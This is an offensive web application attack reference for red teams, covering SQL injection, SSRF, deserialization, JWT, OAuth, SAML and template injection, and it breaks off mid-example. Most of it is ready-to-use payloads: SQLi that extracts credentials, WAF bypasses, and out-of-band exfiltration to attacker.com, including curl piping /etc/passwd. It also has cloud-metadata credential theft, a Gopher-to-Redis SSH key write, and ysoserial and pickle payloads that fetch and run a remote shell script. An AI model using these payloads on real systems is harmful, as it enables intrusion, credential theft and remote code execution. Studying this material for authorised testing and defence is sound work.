# Web Application Exploitation - Comprehensive Attack Reference

> **MITRE ATT&CK Mapping**: T1190 (Exploit Public-Facing Application), T1659 (Content Injection)
> **Tactic**: Initial Access, Execution
> **Platforms**: Web Applications (Linux, Windows, Cloud-hosted)
> **Required Permissions**: Varies (unauthenticated to authenticated user)
> **OPSEC Risk**: Medium to High (web application attacks generate logs, WAF alerts, and anomalous traffic patterns)

---

## Strategic Overview

Web application exploitation remains the single most prevalent initial access vector for red team engagements and real-world adversaries alike. As of 2025-2026, the attack surface has expanded dramatically with the proliferation of microservices architectures, serverless functions, GraphQL APIs, and AI/ML-integrated endpoints. The shift from monolithic applications to distributed systems has introduced new classes of vulnerabilities including HTTP/2 desync attacks, server-side prototype pollution chains, and SSRF exploitation against cloud metadata services --- the latter seeing a 452% surge between 2023 and 2024 according to threat intelligence reports.

Modern web application testing requires a layered approach that combines automated scanning with manual exploitation. Automated tools like SQLMap, Burp Suite Professional, and Nuclei can identify low-hanging fruit, but complex vulnerabilities such as second-order SQL injection, business logic flaws, deserialization chains, and authentication bypass via JWT algorithm confusion demand manual analysis and creative chaining. Red team operators must understand not only individual vulnerability classes but how they combine: an SSRF vulnerability that accesses cloud metadata can yield IAM credentials that provide access to entire cloud environments; a prototype pollution flaw chained with a template injection can escalate to full remote code execution.

This reference covers every major web application attack class with actionable payloads, tool configurations, bypass techniques, and OPSEC considerations. Each section progresses from fundamental concepts through advanced exploitation, with emphasis on techniques validated against modern defenses including WAFs, CSPs, and cloud-native security controls as of 2025-2026.

---

## 1. SQL Injection (SQLi)

SQL injection exploits insufficient input validation in database queries, allowing an attacker to manipulate the SQL statement executed by the application. Despite decades of awareness, SQLi remains in the OWASP Top 10 and is regularly discovered in production applications.

### 1.1 Union-Based SQL Injection

Union-based injection leverages the UNION SQL operator to append additional SELECT statements to the original query, extracting data from other tables.

**Column Enumeration:**
```sql
# Determine number of columns using ORDER BY
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -    (increment until error)

# Alternative: NULL-based column count
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -

# Identify string-compatible columns
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
```

**Data Extraction (MySQL):**
```sql
# Extract database version and user
' UNION SELECT version(),user(),database()-- -

# Enumerate databases
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata-- -

# Enumerate tables in target database
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='targetdb'-- -

# Enumerate columns
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -

# Extract credentials
' UNION SELECT username,password,NULL FROM users-- -

# Concatenate multiple columns into one
' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL,NULL FROM users-- -
```

**Data Extraction (MSSQL):**
```sql
# System information
' UNION SELECT @@version,NULL,NULL-- -
' UNION SELECT DB_NAME(),SYSTEM_USER,NULL-- -

# Enumerate databases
' UNION SELECT name,NULL,NULL FROM master..sysdatabases-- -

# Enumerate tables
' UNION SELECT name,NULL,NULL FROM targetdb..sysobjects WHERE xtype='U'-- -

# Enumerate columns
' UNION SELECT name,NULL,NULL FROM syscolumns WHERE id=OBJECT_ID('users')-- -
```

**Data Extraction (PostgreSQL):**
```sql
# Version and user
' UNION SELECT version(),current_user,NULL-- -

# Enumerate databases
' UNION SELECT datname,NULL,NULL FROM pg_database-- -

# Enumerate tables
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'-- -

# String aggregation
' UNION SELECT string_agg(username||':'||password, ','),NULL,NULL FROM users-- -
```

**Data Extraction (Oracle):**
```sql
# Oracle requires FROM dual for simple selects
' UNION SELECT banner,NULL FROM v$version-- -
' UNION SELECT user,NULL FROM dual-- -

# Enumerate tables
' UNION SELECT table_name,NULL FROM all_tables-- -

# Enumerate columns
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -
```

### 1.2 Blind Boolean-Based SQL Injection

Used when the application does not return query results directly but shows different behavior (e.g., different page content, HTTP status codes) based on whether the injected condition is true or false.

```sql
# Basic true/false inference
' AND 1=1-- -    (true - normal response)
' AND 1=2-- -    (false - different response)

# Extract database name character by character
' AND SUBSTRING(database(),1,1)='a'-- -
' AND SUBSTRING(database(),1,1)='b'-- -

# Using ASCII values for binary search efficiency
' AND ASCII(SUBSTRING(database(),1,1))>96-- -
' AND ASCII(SUBSTRING(database(),1,1))>109-- -
' AND ASCII(SUBSTRING(database(),1,1))>103-- -

# Extract data length first
' AND LENGTH(database())=8-- -

# MySQL-specific: using MID() and ORD()
' AND ORD(MID((SELECT password FROM users LIMIT 0,1),1,1))>96-- -

# MSSQL-specific
' AND UNICODE(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>96-- -

# PostgreSQL-specific
' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>96-- -

# Extract table names
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE 'user%')>0-- -
```

### 1.3 Blind Time-Based SQL Injection

When boolean differences are not observable, time delays confirm injection. The application response time reveals true/false conditions.

```sql
# MySQL time-based
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(5),0)-- -
' AND BENCHMARK(10000000,SHA1('test'))-- -

# MSSQL time-based
'; WAITFOR DELAY '0:0:5'-- -
'; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>96) WAITFOR DELAY '0:0:5'-- -

# PostgreSQL time-based
'; SELECT pg_sleep(5)-- -
' AND CASE WHEN (ASCII(SUBSTR(current_user,1,1))>96) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

# Oracle time-based
' AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END-- -

# Conditional time with heavy query (universal fallback)
' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)>0-- -
```

### 1.4 Error-Based SQL Injection

Exploits database error messages to extract data directly within error output.

```sql
# MySQL error-based using extractvalue()
' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
' AND extractvalue(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e))-- -

# MySQL using updatexml()
' AND updatexml(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -

# MySQL double query / subquery error
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -

# MSSQL error-based using CONVERT/CAST
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))-- -
' AND 1=CAST((SELECT TOP 1 password FROM users) AS int)-- -

# MSSQL using FOR XML PATH for multi-row extraction
' AND 1=CONVERT(int,(SELECT username+':'+password+' ' FROM users FOR XML PATH('')))-- -

# PostgreSQL error-based using CAST
' AND 1=CAST((SELECT version()) AS int)-- -

# Oracle error-based
' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -
' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT version FROM v$instance))-- -
```

### 1.5 Second-Order SQL Injection

Occurs when user input is stored in the database and later used unsafely in a different SQL query. The injection payload is stored during one operation (e.g., registration) and triggered during another (e.g., password change, profile view).

```
# Example scenario: User registration with malicious username
Username: admin'-- -
Password: anything

# Later, when the application uses the stored username in a query:
# UPDATE users SET password='newpass' WHERE username='admin'-- -' AND password='oldpass'
# This changes the admin's password without knowing the old password

# Second-order in profile update
# Store: Display Name = "'; DROP TABLE logs;-- -"
# Trigger: SELECT * FROM logs WHERE created_by = '' ; DROP TABLE logs;-- -'

# Detection approach: Register with SQLi payloads, then trigger stored data usage
# Common injection points: username fields, address fields, profile bio, order notes
```

### 1.6 Out-of-Band (OOB) SQL Injection

Exfiltrates data through DNS or HTTP channels when direct and time-based methods fail.

```sql
# MySQL OOB via LOAD_FILE (requires FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT password FROM users LIMIT 1),
  '.attacker.com\\share'))-- -

# MSSQL OOB via xp_dirtree (DNS exfiltration)
'; DECLARE @d varchar(1024);
  SET @d=(SELECT TOP 1 password FROM users);
  EXEC master..xp_dirtree '\\'+@d+'.attacker.com\share'-- -

# MSSQL OOB via xp_fileexist
'; DECLARE @d varchar(1024);
  SET @d=(SELECT TOP 1 password FROM users);
  EXEC master..xp_fileexist '\\'+@d+'.attacker.com\share'-- -

# Oracle OOB via UTL_HTTP
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual-- -

# Oracle OOB via UTL_INADDR (DNS)
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM dual-- -

# Oracle via DBMS_LDAP
' UNION SELECT DBMS_LDAP.INIT((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com',80) FROM dual-- -

# PostgreSQL OOB via dblink (if extension loaded)
' UNION SELECT dblink_send_query('host=attacker.com dbname=d','SELECT 1')-- -

# PostgreSQL OOB via COPY
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/?d=$(cat /etc/passwd)'-- -
```

### 1.7 WAF Bypass Techniques

```sql
# Inline comments (MySQL-specific version comments)
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
UN/**/ION SE/**/LECT 1,2,3-- -

# Case variation
uNiOn SeLeCt 1,2,3-- -

# URL encoding
%55%4e%49%4f%4e%20%53%45%4c%45%43%54  (UNION SELECT)

# Double URL encoding
%2555%254e%2549%254f%254e  (UNION)

# Unicode encoding
\u0055NION \u0053ELECT

# Whitespace alternatives
UNION%09SELECT    (tab)
UNION%0ASELECT    (newline)
UNION%0DSELECT    (carriage return)
UNION%0BSELECT    (vertical tab)
UNION%A0SELECT    (non-breaking space)
UNION(SELECT 1,2,3)

# Comment-based WAF bypass
UNION/**/SELECT/**/1,2,3
UNION/*!SELECT*/1,2,3
/**//*!12345UNION SELECT*//**/1,2,3

# Using LIKE instead of = for string comparison
' OR username LIKE 'admin' AND password LIKE '%'-- -

# HPP (HTTP Parameter Pollution)
?id=1 UNION/*&id=*/SELECT 1,2,3

# Chunked transfer encoding bypass (for request body)
# Split the payload across chunked boundaries to evade pattern matching

# Hex encoding in MySQL
' UNION SELECT 0x61646d696e-- -  (admin in hex)

# CHAR() function bypass
' UNION SELECT CHAR(97,100,109,105,110)-- -

# Scientific notation for numbers
1e0UNION SELECT 1,2,3

# JSON-based injection (MySQL 5.7+)
' UNION SELECT JSON_EXTRACT('{"a":"b"}','$.a'),2,3-- -

# No-space techniques
'UNION(SELECT(1),(2),(3))-- -
'||'1'='1
```

### 1.8 SQLMap Usage

```bash
# Basic detection
sqlmap -u "http://target/page?id=1" --batch --random-agent

# POST request with specific parameter
sqlmap -u "http://target/login" --data="user=admin&pass=test" -p "user" --batch

# Cookie-based injection
sqlmap -u "http://target/dashboard" --cookie="session=abc123; id=1*" --batch

# Header-based injection
sqlmap -u "http://target/" --headers="X-Forwarded-For: 1*" --batch

# Tamper scripts for WAF bypass
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between,randomcase --batch

# Extract specific data
sqlmap -u "http://target/page?id=1" -D targetdb -T users -C username,password --dump

# OS shell (requires stacked queries or file write)
sqlmap -u "http://target/page?id=1" --os-shell

# Second-order injection
sqlmap -u "http://target/profile" --second-url="http://target/view" --batch

# Risk and level escalation
sqlmap -u "http://target/page?id=1" --level=5 --risk=3 --batch

# Proxy through Burp
sqlmap -u "http://target/page?id=1" --proxy="http://127.0.0.1:8080"

# Custom injection point in request file
sqlmap -r request.txt -p "id" --batch --threads=10
```

---

## 2. Server-Side Request Forgery (SSRF)

SSRF allows an attacker to cause the server to make HTTP requests to arbitrary destinations, typically targeting internal services, cloud metadata endpoints, or other backend systems inaccessible from the internet. SSRF attacks surged 452% between 2023-2024 and continue to be a critical vector in 2025 cloud environments.

### 2.1 Cloud Metadata Exploitation

```bash
# AWS IMDSv1 (Instance Metadata Service)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
http://169.254.169.254/latest/user-data/

# AWS IMDSv2 (requires token - harder to exploit via basic SSRF)
# Step 1: Get token (requires PUT with header - may fail via simple SSRF)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata Service
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Note: GCP requires header "Metadata-Flavor: Google" - may be bypassable via redirect

# Azure Instance Metadata Service (IMDS)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Azure requires header: Metadata: true

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address

# Oracle Cloud Infrastructure
http://169.254.169.254/opc/v2/instance/
http://169.254.169.254/opc/v2/identity/
```

### 2.2 Protocol Smuggling

```bash
# Gopher protocol (powerful - can craft arbitrary TCP payloads)
# Gopher to Redis (flush all keys)
gopher://127.0.0.1:6379/_FLUSHALL%0D%0A

# Gopher to Redis (write SSH key)
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh/%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASET%20payload%20%22%0A%0Assh-rsa%20AAAAB3...%20attacker%40host%0A%0A%22%0D%0ASAVE%0D%0A

# Gopher to internal SMTP (send email)
gopher://127.0.0.1:25/_EHLO%20attacker%0D%0AMAIL%20FROM:<attacker@evil.com>%0D%0ARCPT%20TO:<admin@target.com>%0D%0ADATA%0D%0ASubject:%20Test%0D%0A%0D%0AMessage%0D%0A.%0D%0AQUIT

# Gopher to MySQL (authentication-free)
# Use gopherus tool to generate MySQL payloads:
# python gopherus.py --exploit mysql

# File protocol
file:///etc/passwd
file:///c:/windows/system32/drivers/etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/net/tcp

# Dict protocol (port scanning and service fingerprinting)
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:11211/stats

# LDAP protocol
ldap://127.0.0.1:389/%0astats%0aquit
```

### 2.3 SSRF Filter Bypass Techniques

```bash
# IPv6 representations of localhost
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# Decimal IP notation
http://2130706433/          # 127.0.0.1 in decimal
http://017700000001/        # 127.0.0.1 in octal
http://0x7f000001/          # 127.0.0.1 in hex

# Mixed notation
http://0x7f.0.0.1/
http://0177.0.0.1/
http://127.1/               # Shortened (some parsers accept)
http://127.0.1/

# URL encoding
http://127.0.0.1 -> http://%31%32%37%2e%30%2e%30%2e%31

# DNS rebinding
# Register a domain that alternates between attacker IP and 127.0.0.1
# Tools: rebind.network, rbndr.us, taviso DNS rebinder
# 1. First resolution -> allowed external IP
# 2. Second resolution (server-side fetch) -> 127.0.0.1
# Use short TTL (0 or 1 second) for DNS record

# Redirect-based bypass
# Host a page at http://attacker.com/redirect that 302 redirects to http://169.254.169.254/
# The initial URL check passes, but the redirect hits internal resources

# URL parsing inconsistencies
http://attacker.com@169.254.169.254/   # Userinfo confusion
http://169.254.169.254#@attacker.com   # Fragment confusion
http://169.254.169.254%00.attacker.com # Null byte injection
http://attacker.com/..;/internal       # Path traversal through reverse proxy

# Domain confusion
http://169.254.169.254.nip.io/         # Wildcard DNS services
http://localtest.me/                    # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net/   # Custom DNS resolution

# CRLF injection in URL
http://attacker.com%0d%0aHost:%20169.254.169.254

# Protocol switching
# Application checks for http:// but follows redirects to gopher://
```

### 2.4 SSRF in Modern Applications

```
# Webhook URLs - applications that fetch user-specified URLs
POST /api/webhooks
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# PDF generators (wkhtmltopdf, Puppeteer, Chrome headless)
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
<img src="http://internal-service:8080/admin">
<link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">

# Image processors (ImageMagick, GraphicsMagick)
# SVG with SSRF
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/" />
</svg>

# AI/ML API endpoints (model fetching, dataset URLs)
POST /api/ml/train
{"dataset_url": "http://169.254.169.254/latest/meta-data/"}

# Import/export functionality
POST /api/import
{"source_url": "http://internal-api:3000/admin/users"}

# URL preview / link unfurling (Slack-like apps)
POST /api/messages
{"text": "Check out http://169.254.169.254/latest/meta-data/"}
```

### 2.5 Blind SSRF Detection

```bash
# DNS callback detection
# Use Burp Collaborator, interactsh, or custom DNS server
http://uniqueid.burpcollaborator.net/
http://uniqueid.interact.sh/

# HTTP callback with data encoding
http://attacker-server.com/ssrf?data=BASE64_ENCODED_RESPONSE

# Timing-based detection
# Compare response times for:
http://127.0.0.1:80/      # Open port - fast response
http://127.0.0.1:1234/    # Closed port - different timing
http://192.168.1.1:80/    # Internal host - different timing

# Internal port scanning via SSRF
# Iterate through ports, measuring response differences
for port in 21 22 25 80 443 3306 5432 6379 8080 8443 9200; do
  curl "http://target/fetch?url=http://127.0.0.1:$port/"
done
```

### 2.6 SSRF-to-RCE Chains

```
# SSRF -> Cloud Metadata -> IAM Credentials -> Cloud RCE
1. Exploit SSRF to reach http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. Retrieve temporary IAM credentials (AccessKeyId, SecretAccessKey, Token)
3. Use credentials to interact with AWS services (S3, Lambda, EC2, SSM)
4. Execute commands via AWS SSM Run Command or deploy malicious Lambda

# SSRF -> Redis -> RCE
1. SSRF to gopher://127.0.0.1:6379/ with Redis commands
2. Write crontab or SSH keys via Redis CONFIG SET
3. Achieve command execution on the host

# SSRF -> Internal Admin Panel -> RCE
1. SSRF to internal Jenkins/Kubernetes dashboard
2. Execute build jobs or deploy containers
3. Achieve code execution within the internal network
```

---

## 3. Deserialization Attacks

Insecure deserialization occurs when an application deserializes untrusted data without proper validation, allowing attackers to manipulate serialized objects to achieve code execution, privilege escalation, or other malicious outcomes.

### 3.1 Java Deserialization

Java serialized objects are identified by the magic bytes `AC ED 00 05` (hex) or `rO0AB` (Base64). Common attack surface includes RMI, JMX, custom socket protocols, HTTP parameters, and cookies.

```bash
# ysoserial - Generate deserialization payloads
# CommonsCollections chains (most common)
java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/shell.sh | bash" | base64

# Available gadget chains (subset of 34 total):
# CommonsCollections1-7    (Apache Commons Collections)
# CommonsCollections5      (most reliable, works with CC 3.1)
# CommonsBeanutils1        (Apache Commons Beanutils)
# Spring1, Spring2         (Spring Framework)
# Groovy1                  (Apache Groovy)
# Jdk7u21                  (JDK 7u21 and earlier)
# Hibernate1               (Hibernate ORM)
# URLDNS                   (DNS lookup - detection only, no RCE)

# Detection with URLDNS (safe, no RCE, confirms deserialization)
java -jar ysoserial.jar URLDNS "http://uniqueid.burpcollaborator.net" | base64

# Jackson deserialization (polymorphic type handling)
# Exploit requires enableDefaultTyping() or @JsonTypeInfo
{
  "object": ["com.sun.rowset.JdbcRowSetImpl",
    {"dataSourceName": "ldap://attacker.com/exploit",
     "autoCommit": true}]
}

# JNDI injection via deserialization (Java < 8u191 for remote codebase)
# Payload triggers JNDI lookup to attacker LDAP/RMI server
# Use tools: marshalsec, JNDI-Exploit-Kit, rogue-jndi

# XStream deserialization
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>calc</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>

# JMX/RMI exploitation
# Scan for RMI registries
nmap -p 1099,1098 --script rmi-dumpregistry target

# Exploit with ysoserial's exploit module
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target 1099 CommonsCollections5 "id"
```

### 3.2 .NET Deserialization

```csharp
// Dangerous formatters:
// BinaryFormatter, LosFormatter, NetDataContractSerializer,
// ObjectStateFormatter, SoapFormatter

// ysoserial.net - Generate .NET deserialization payloads
// Common gadgets:
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami > C:\\temp\\out.txt"
ysoserial.exe -g PSObject -f BinaryFormatter -c "calc"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc"

// ViewState exploitation (ASP.NET)
// If machineKey is known (web.config disclosure, default keys):
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c whoami" \
  --validationalg="SHA1" \
  --validationkey="KEY_HERE" \
  --generator="GENERATOR" \
  --viewstateuserkey="" \
  --isdebug

// Json.NET TypeNameHandling vulnerability
// Requires TypeNameHandling.All or TypeNameHandling.Auto
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```

### 3.3 PHP Deserialization

```php
// PHP unserialize() exploitation via magic methods
// __wakeup()  - called on unserialize
// __destruct() - called when object is destroyed
// __toString() - called when object is used as string

// Example gadget chain:
// O:4:"Evil":1:{s:4:"file";s:11:"/etc/passwd";}

// phar:// deserialization (triggers without unserialize call)
// Any file operation on a phar:// URI triggers deserialization of metadata
// Example: file_exists('phar:///uploads/evil.phar/../../../etc/passwd')
// Works with: file_exists, fopen, file_get_contents, include, is_dir, etc.

// Creating a malicious PHAR:
<?php
class Evil {
    public $cmd = 'system("id");';
}
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Evil());
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
// Rename to evil.jpg to bypass upload filters

// PHPGGC - PHP Generic Gadget Chains tool
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 id
phpggc Monolog/RCE1 system id
phpggc Guzzle/FW1 /tmp/shell.php /path/to/shell/content
```

### 3.4 Python Deserialization

```python
# pickle.loads() exploitation
# The __reduce__ method controls deserialization behavior
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

payload = pickle.dumps(Exploit())

# Base64 encoded pickle payload
import base64
print(base64.b64encode(payload).decode())

# PyYAML unsafe_load() exploitation (pre-6.0)
!!python/object/apply:os.system ['id']
!!python/object/apply:subprocess.check_output [['id']]

# PyYAML with FullLoader (some bypasses exist)
!!python/object/apply:builtins.eval ['__import__("os").system("id")']

# Detection: Look for pickle magic bytes \x80\x04\x95 (protocol 4)
# or Base64 encoded versions
```

### 3.5 Node.js Deserialization

```javascript
// node-serialize (CVE-2017-5941)
// Immediately Invoked Function Expression (IIFE) in serialized data
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){/* callback */})}()"}

// Detection: Look for _$$ND_FUNC$$_ markers in cookies/parameters
// Common in Express.js applications using node-serialize for session data
```

---

## 4. Authentication and Session Attacks

### 4.1 JWT (JSON Web Token) Attacks

```bash
# Structure: HEADER.PAYLOAD.SIGNATURE (Base64url encoded)

# 1. Algorithm "none" attack
# Change header to {"alg":"none","typ":"JWT"}
# Remove the signature (keep trailing dot)
# Original: eyJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE
# Exploit:  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Variations: None, NONE, nOnE, none

# 2. RS256 to HS256 algorithm confusion
# Server verifies RS256 tokens with public key
# Attacker changes alg to HS256 and signs with the PUBLIC key as HMAC secret
# The server's verify() function uses the public key for HMAC verification
# Step 1: Obtain public key (/.well-known/jwks.json, /jwks.json, /certs)
# Step 2: Convert JWK to PEM format
# Step 3: Sign modified token with HS256 using the PEM as the secret

# Using jwt_tool:
python3 jwt_tool.py <JWT> -X k -pk public.pem

# 3. Key ID (kid) injection
# kid header points to a key location - may be injectable
# SQLi in kid:
{"alg":"HS256","kid":"' UNION SELECT 'secret-key' -- ","typ":"JWT"}

# Path traversal in kid:
{"alg":"HS256","kid":"../../dev/null","typ":"JWT"}
# Sign with empty string as secret (reading /dev/null returns empty)

# Command injection in kid:
{"alg":"HS256","kid":"key1|/usr/bin/curl http://attacker.com","typ":"JWT"}

# 4. JKU/X5U header injection (JWKS spoofing)
# jku points to URL hosting the public key set
# Attacker hosts a fake JWKS with their own key pair
{"alg":"RS256","jku":"http://attacker.com/.well-known/jwks.json","typ":"JWT"}
# Sign the token with attacker's private key
# Server fetches attacker's JWKS and verifies with attacker's public key

# 5. Embedded JWK attack
# Include the public key directly in the JWT header
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"},"typ":"JWT"}

# jwt_tool comprehensive testing:
python3 jwt_tool.py <JWT> -M at    # Run all known attacks
python3 jwt_tool.py <JWT> -T       # Tamper token values
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # Crack HMAC secret
```

### 4.2 OAuth2 Attacks

```
# Authorization Code Interception
# If redirect_uri validation is weak:
GET /authorize?response_type=code&client_id=APP&redirect_uri=https://attacker.com/callback&scope=read

# Open redirect token theft
# Chain with open redirect on legitimate domain:
GET /authorize?response_type=token&client_id=APP&redirect_uri=https://legitimate.com/redirect?url=https://attacker.com/steal

# PKCE bypass attempts
# If PKCE is optional, omit code_challenge parameter
# If code_verifier is not validated against code_challenge
# Test with mismatched code_verifier values

# Implicit flow token leakage via Referer header
# Token in URL fragment may leak to third-party resources loaded on callback page

# Client secret exposure in mobile/SPA applications
# Decompile mobile apps or inspect JavaScript source for client_secret

# Token scope escalation
# Request additional scopes not authorized: scope=read+write+admin
# Combine multiple APIs: scope=openid+https://api.internal/admin

# State parameter CSRF
# Remove or reuse state parameter to perform cross-site request forgery
```

### 4.3 SAML Attacks

```xml
<!-- Signature Wrapping Attack -->
<!-- Move legitimate signed assertion and inject malicious unsigned assertion -->
<!-- The signature validates against the original, but the application processes the injected one -->

<!-- XML Signature Exclusion -->
<!-- Remove the Signature element entirely -->
<!-- Some implementations don't enforce signature presence -->

<!-- SAML XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:AuthnRequest>
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:AuthnRequest>

<!-- Comment injection in NameID -->
<!-- Original: admin@company.com -->
<!-- Attack: admin@company.com<!---->.evil.com -->
<!-- Some parsers read admin@company.com while others read the full string -->

<!-- SAML Response Replay -->
<!-- Capture valid SAML response and replay it -->
<!-- Check for: timestamp validation, InResponseTo validation, audience restriction -->

# Tools: SAMLRaider (Burp extension), saml2aws
```

### 4.4 Session Attacks

```
# Session Fixation
# Force victim to use attacker-known session ID
# 1. Attacker obtains valid session: SESSIONID=abc123
# 2. Attacker sends link to victim: https://target.com/login?SESSIONID=abc123
# 3. Victim authenticates, session abc123 is now authenticated
# 4. Attacker uses abc123 to access victim's session

# Cookie manipulation
# Insecure cookie attributes:
# - Missing Secure flag: intercept over HTTP
# - Missing HttpOnly: steal via XSS (document.cookie)
# - SameSite=None: CSRF attacks
# - Weak path scope: accessible from other application paths
# - Predictable values: sequential IDs, base64-encoded user data

# Session prediction
# Analyze multiple session tokens for patterns
# Tools: Burp Sequencer for entropy analysis
```

---

## 5. Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded directly into a server-side template rather than being passed as data to the template. This allows injection of template directives that execute on the server.

### 5.1 Detection and Identification

```
# Universal detection polyglots (test each syntax):
{{7*7}}       -> 49 (Jinja2, Twig, Handlebars)
${7*7}        -> 49 (FreeMarker, Mako, Velocity)
#{7*7}        -> 49 (Thymeleaf, Spring EL, Ruby ERB variant)
<%= 7*7 %>    -> 49 (ERB, EJS)
{{7*'7'}}     -> 7777777 (Jinja2 - string multiplication confirms Python)
${7*'7'}      -> Error in FreeMarker vs 49 in other engines

# Identification flow:
# 1. Inject {{7*7}} - if 49, it is expression-based
# 2. Inject {{7*'7'}} - if 7777777, confirms Jinja2/Python
# 3. Inject ${7*7} - if 49, test Java-based engines
# 4. Try {{config}} - Jinja2/Flask config leak
# 5. Try {{self}} - returns template object info
```

### 5.2 Jinja2 (Python/Flask)

```python
# Configuration leak
{{config}}
{{config.items()}}
{{request.environ}}
{{request.application.__self__._get_data_for_json.__globals__}}

# RCE via MRO chain (Method Resolution Order)
# Access the base object class and enumerate subclasses
{{''.__class__.__mro__[1].__subclasses__()}}

# Find subprocess.Popen (index varies by Python version)
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}

# Common approach - find os._wrap_close class
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
